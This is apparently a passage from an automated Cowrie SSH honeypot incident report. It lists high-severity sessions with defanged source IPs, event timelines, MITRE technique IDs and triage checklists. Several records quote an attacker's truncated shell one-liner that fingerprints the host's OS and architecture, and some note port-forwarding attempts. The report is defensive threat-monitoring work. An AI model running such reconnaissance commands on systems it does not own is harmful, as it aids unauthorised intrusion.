- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ee3d9b1b17

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-12 17:13 |
| **Last Seen** | 2026-07-12 17:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:13:43` | `cowrie.session.connect` |
| `2026-07-12 17:13:43` | `cowrie.client.version` |
| `2026-07-12 17:13:43` | `cowrie.client.kex` |
| `2026-07-12 17:13:44` | `cowrie.login.success` |
| `2026-07-12 17:13:44` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:13:44` | `cowrie.direct-tcpip.data` |
| `2026-07-12 17:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c1794bbfbc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:13 |
| **Last Seen** | 2026-07-12 17:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:13:48` | `cowrie.session.connect` |
| `2026-07-12 17:13:49` | `cowrie.client.version` |
| `2026-07-12 17:13:49` | `cowrie.client.kex` |
| `2026-07-12 17:13:51` | `cowrie.login.success` |
| `2026-07-12 17:13:52` | `cowrie.session.params` |
| `2026-07-12 17:13:52` | `cowrie.command.input` |
| `2026-07-12 17:13:52` | `cowrie.command.input` |
| `2026-07-12 17:13:52` | `cowrie.command.input` |
| `2026-07-12 17:13:52` | `cowrie.command.input` |
| `2026-07-12 17:13:52` | `cowrie.command.input` |
| `2026-07-12 17:13:52` | `cowrie.command.success` |
| `2026-07-12 17:13:52` | `cowrie.command.input` |
| `2026-07-12 17:13:52` | `cowrie.command.input` |
| `2026-07-12 17:13:52` | `cowrie.command.input` |
| `2026-07-12 17:13:52` | `cowrie.command.input` |
| `2026-07-12 17:13:52` | `cowrie.log.closed` |
| `2026-07-12 17:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a0e5d52e0e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:13 |
| **Last Seen** | 2026-07-12 17:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:13:51` | `cowrie.session.connect` |
| `2026-07-12 17:13:51` | `cowrie.client.version` |
| `2026-07-12 17:13:51` | `cowrie.client.kex` |
| `2026-07-12 17:13:53` | `cowrie.login.success` |
| `2026-07-12 17:13:54` | `cowrie.session.params` |
| `2026-07-12 17:13:54` | `cowrie.command.input` |
| `2026-07-12 17:13:54` | `cowrie.command.input` |
| `2026-07-12 17:13:54` | `cowrie.command.input` |
| `2026-07-12 17:13:54` | `cowrie.command.input` |
| `2026-07-12 17:13:54` | `cowrie.command.input` |
| `2026-07-12 17:13:54` | `cowrie.command.success` |
| `2026-07-12 17:13:54` | `cowrie.command.input` |
| `2026-07-12 17:13:54` | `cowrie.command.input` |
| `2026-07-12 17:13:54` | `cowrie.command.input` |
| `2026-07-12 17:13:54` | `cowrie.command.input` |
| `2026-07-12 17:13:55` | `cowrie.log.closed` |
| `2026-07-12 17:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d3a655e73a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:14 |
| **Last Seen** | 2026-07-12 17:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:14:37` | `cowrie.session.connect` |
| `2026-07-12 17:14:38` | `cowrie.client.version` |
| `2026-07-12 17:14:38` | `cowrie.client.kex` |
| `2026-07-12 17:14:38` | `cowrie.login.success` |
| `2026-07-12 17:14:39` | `cowrie.session.params` |
| `2026-07-12 17:14:39` | `cowrie.command.input` |
| `2026-07-12 17:14:39` | `cowrie.command.input` |
| `2026-07-12 17:14:39` | `cowrie.command.input` |
| `2026-07-12 17:14:39` | `cowrie.command.input` |
| `2026-07-12 17:14:39` | `cowrie.command.input` |
| `2026-07-12 17:14:39` | `cowrie.command.success` |
| `2026-07-12 17:14:39` | `cowrie.command.input` |
| `2026-07-12 17:14:39` | `cowrie.command.input` |
| `2026-07-12 17:14:39` | `cowrie.command.input` |
| `2026-07-12 17:14:39` | `cowrie.command.input` |
| `2026-07-12 17:14:39` | `cowrie.log.closed` |
| `2026-07-12 17:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab7778726c4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:15 |
| **Last Seen** | 2026-07-12 17:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:15:47` | `cowrie.session.connect` |
| `2026-07-12 17:15:48` | `cowrie.client.version` |
| `2026-07-12 17:15:48` | `cowrie.client.kex` |
| `2026-07-12 17:15:51` | `cowrie.login.success` |
| `2026-07-12 17:15:52` | `cowrie.session.params` |
| `2026-07-12 17:15:52` | `cowrie.command.input` |
| `2026-07-12 17:15:52` | `cowrie.command.input` |
| `2026-07-12 17:15:52` | `cowrie.command.input` |
| `2026-07-12 17:15:52` | `cowrie.command.input` |
| `2026-07-12 17:15:52` | `cowrie.command.input` |
| `2026-07-12 17:15:52` | `cowrie.command.success` |
| `2026-07-12 17:15:52` | `cowrie.command.input` |
| `2026-07-12 17:15:52` | `cowrie.command.input` |
| `2026-07-12 17:15:52` | `cowrie.command.input` |
| `2026-07-12 17:15:52` | `cowrie.command.input` |
| `2026-07-12 17:15:52` | `cowrie.log.closed` |
| `2026-07-12 17:15:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af577dc33e6b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:15 |
| **Last Seen** | 2026-07-12 17:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:15:54` | `cowrie.session.connect` |
| `2026-07-12 17:15:55` | `cowrie.client.version` |
| `2026-07-12 17:15:55` | `cowrie.client.kex` |
| `2026-07-12 17:15:57` | `cowrie.login.success` |
| `2026-07-12 17:15:58` | `cowrie.session.params` |
| `2026-07-12 17:15:58` | `cowrie.command.input` |
| `2026-07-12 17:15:58` | `cowrie.command.input` |
| `2026-07-12 17:15:58` | `cowrie.command.input` |
| `2026-07-12 17:15:58` | `cowrie.command.input` |
| `2026-07-12 17:15:58` | `cowrie.command.input` |
| `2026-07-12 17:15:58` | `cowrie.command.success` |
| `2026-07-12 17:15:58` | `cowrie.command.input` |
| `2026-07-12 17:15:58` | `cowrie.command.input` |
| `2026-07-12 17:15:58` | `cowrie.command.input` |
| `2026-07-12 17:15:58` | `cowrie.command.input` |
| `2026-07-12 17:15:59` | `cowrie.log.closed` |
| `2026-07-12 17:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57319251bea0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:16 |
| **Last Seen** | 2026-07-12 17:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:16:59` | `cowrie.session.connect` |
| `2026-07-12 17:16:59` | `cowrie.client.version` |
| `2026-07-12 17:16:59` | `cowrie.client.kex` |
| `2026-07-12 17:16:59` | `cowrie.login.success` |
| `2026-07-12 17:17:00` | `cowrie.session.params` |
| `2026-07-12 17:17:00` | `cowrie.command.input` |
| `2026-07-12 17:17:00` | `cowrie.command.input` |
| `2026-07-12 17:17:00` | `cowrie.command.input` |
| `2026-07-12 17:17:00` | `cowrie.command.input` |
| `2026-07-12 17:17:00` | `cowrie.command.input` |
| `2026-07-12 17:17:00` | `cowrie.command.success` |
| `2026-07-12 17:17:00` | `cowrie.command.input` |
| `2026-07-12 17:17:00` | `cowrie.command.input` |
| `2026-07-12 17:17:00` | `cowrie.command.input` |
| `2026-07-12 17:17:00` | `cowrie.command.input` |
| `2026-07-12 17:17:01` | `cowrie.log.closed` |
| `2026-07-12 17:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f323121f83ed

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]92` |
| **First Seen** | 2026-07-12 17:17 |
| **Last Seen** | 2026-07-12 17:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:17:29` | `cowrie.session.connect` |
| `2026-07-12 17:17:29` | `cowrie.client.version` |
| `2026-07-12 17:17:29` | `cowrie.client.kex` |
| `2026-07-12 17:17:31` | `cowrie.login.success` |
| `2026-07-12 17:17:32` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]92` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fae3344a6fe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:17 |
| **Last Seen** | 2026-07-12 17:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:17:54` | `cowrie.session.connect` |
| `2026-07-12 17:17:55` | `cowrie.client.version` |
| `2026-07-12 17:17:55` | `cowrie.client.kex` |
| `2026-07-12 17:17:59` | `cowrie.login.success` |
| `2026-07-12 17:18:00` | `cowrie.session.params` |
| `2026-07-12 17:18:00` | `cowrie.command.input` |
| `2026-07-12 17:18:00` | `cowrie.command.input` |
| `2026-07-12 17:18:00` | `cowrie.command.input` |
| `2026-07-12 17:18:00` | `cowrie.command.input` |
| `2026-07-12 17:18:00` | `cowrie.command.input` |
| `2026-07-12 17:18:00` | `cowrie.command.success` |
| `2026-07-12 17:18:00` | `cowrie.command.input` |
| `2026-07-12 17:18:00` | `cowrie.command.input` |
| `2026-07-12 17:18:00` | `cowrie.command.input` |
| `2026-07-12 17:18:00` | `cowrie.command.input` |
| `2026-07-12 17:18:01` | `cowrie.log.closed` |
| `2026-07-12 17:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e7f8940eba0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:17 |
| **Last Seen** | 2026-07-12 17:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:17:55` | `cowrie.session.connect` |
| `2026-07-12 17:17:55` | `cowrie.client.version` |
| `2026-07-12 17:17:55` | `cowrie.client.kex` |
| `2026-07-12 17:17:57` | `cowrie.login.success` |
| `2026-07-12 17:17:59` | `cowrie.session.params` |
| `2026-07-12 17:17:59` | `cowrie.command.input` |
| `2026-07-12 17:17:59` | `cowrie.command.input` |
| `2026-07-12 17:17:59` | `cowrie.command.input` |
| `2026-07-12 17:17:59` | `cowrie.command.input` |
| `2026-07-12 17:17:59` | `cowrie.command.input` |
| `2026-07-12 17:17:59` | `cowrie.command.success` |
| `2026-07-12 17:17:59` | `cowrie.command.input` |
| `2026-07-12 17:17:59` | `cowrie.command.input` |
| `2026-07-12 17:17:59` | `cowrie.command.input` |
| `2026-07-12 17:17:59` | `cowrie.command.input` |
| `2026-07-12 17:18:00` | `cowrie.log.closed` |
| `2026-07-12 17:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bae8214f0563

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 17:18 |
| **Last Seen** | 2026-07-12 17:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:18:46` | `cowrie.session.connect` |
| `2026-07-12 17:18:47` | `cowrie.client.version` |
| `2026-07-12 17:18:47` | `cowrie.client.kex` |
| `2026-07-12 17:18:49` | `cowrie.login.success` |
| `2026-07-12 17:18:52` | `cowrie.session.params` |
| `2026-07-12 17:18:52` | `cowrie.command.input` |
| `2026-07-12 17:18:53` | `cowrie.log.closed` |
| `2026-07-12 17:18:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb18741bfaa

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-12 17:18 |
| **Last Seen** | 2026-07-12 17:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:18:59` | `cowrie.session.connect` |
| `2026-07-12 17:18:59` | `cowrie.client.version` |
| `2026-07-12 17:18:59` | `cowrie.client.kex` |
| `2026-07-12 17:18:59` | `cowrie.login.success` |
| `2026-07-12 17:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d513070f4959

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-12 17:18 |
| **Last Seen** | 2026-07-12 17:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:18:59` | `cowrie.session.connect` |
| `2026-07-12 17:18:59` | `cowrie.client.version` |
| `2026-07-12 17:18:59` | `cowrie.client.kex` |
| `2026-07-12 17:18:59` | `cowrie.login.success` |
| `2026-07-12 17:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f90df12c114e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-12 17:19 |
| **Last Seen** | 2026-07-12 17:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:19:08` | `cowrie.session.connect` |
| `2026-07-12 17:19:08` | `cowrie.client.version` |
| `2026-07-12 17:19:08` | `cowrie.client.kex` |
| `2026-07-12 17:19:08` | `cowrie.login.success` |
| `2026-07-12 17:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f99be0fae474

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-12 17:19 |
| **Last Seen** | 2026-07-12 17:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:19:08` | `cowrie.session.connect` |
| `2026-07-12 17:19:08` | `cowrie.client.version` |
| `2026-07-12 17:19:08` | `cowrie.client.kex` |
| `2026-07-12 17:19:08` | `cowrie.login.success` |
| `2026-07-12 17:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24b575f6d209

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:19 |
| **Last Seen** | 2026-07-12 17:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:19:28` | `cowrie.session.connect` |
| `2026-07-12 17:19:28` | `cowrie.client.version` |
| `2026-07-12 17:19:28` | `cowrie.client.kex` |
| `2026-07-12 17:19:29` | `cowrie.login.success` |
| `2026-07-12 17:19:30` | `cowrie.session.params` |
| `2026-07-12 17:19:30` | `cowrie.command.input` |
| `2026-07-12 17:19:30` | `cowrie.command.input` |
| `2026-07-12 17:19:30` | `cowrie.command.input` |
| `2026-07-12 17:19:30` | `cowrie.command.input` |
| `2026-07-12 17:19:30` | `cowrie.command.input` |
| `2026-07-12 17:19:30` | `cowrie.command.success` |
| `2026-07-12 17:19:30` | `cowrie.command.input` |
| `2026-07-12 17:19:30` | `cowrie.command.input` |
| `2026-07-12 17:19:30` | `cowrie.command.input` |
| `2026-07-12 17:19:30` | `cowrie.command.input` |
| `2026-07-12 17:19:30` | `cowrie.log.closed` |
| `2026-07-12 17:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b65d37ae117e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:19 |
| **Last Seen** | 2026-07-12 17:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
